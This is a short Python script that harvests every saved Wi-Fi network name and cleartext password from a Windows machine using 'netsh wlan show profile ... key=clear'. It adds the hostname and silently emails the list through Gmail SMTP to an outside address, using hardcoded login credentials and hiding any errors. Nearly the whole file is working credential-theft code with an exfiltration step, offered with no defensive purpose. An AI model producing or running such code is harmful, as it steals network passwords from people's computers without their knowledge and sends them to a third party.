################################################# Jerrell Abrahams ########################################################

import subprocess
import re
import smtplib



# Emails used to send Wifi content below
EMAIL = "pythondev1101@gmail.com"
PASSWORD = "abcd12345()"
TO_EMAIL = "jerrellabrahams50@gmail.com"


# The username of the host
host_command = subprocess.run("hostname", shell=True, text=True, capture_output=True)
host_name = host_command.stdout

# The instructions for obtaining the wifi data
text = subprocess.run("netsh wlan show profiles", shell=True, text=True, capture_output=True)

wifi_names = re.compile(r":\s(.+)")

profiles = wifi_names.findall(text.stdout)

wifi_details = ""

for profile in profiles:
    wifi_information = subprocess.run(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True, text=True, capture_output=True)
    decoder = re.compile(r" {4}Key Content {12}: (.+)")
    wifi_password = decoder.findall(wifi_information.stdout)
    wifi_details += f"{profile} - {wifi_password[0]}\n"


try:
    with open("wifi_content.txt", "a", encoding="utf-8") as file:
        file.write(f"Here is the list of Wifi's accessed by: {host_name} \n\n{wifi_details}\n\n")
except (FileNotFoundError):
    pass


# Library used to send the data to receiver
try:
    with smtplib.SMTP("smtp.gmail.com") as mail:
        mail.starttls()
        mail.login(user=EMAIL, password=PASSWORD)
        mail.sendmail(from_addr=EMAIL, to_addrs=TO_EMAIL, msg=f"Subject:Wifi Script\n\n Here is the list of Wifi's accessed by: {host_name}\n\n"
                                                          f"{wifi_details}")
except (Exception):
    pass


########################################################## 2021/08/02 #######################################################################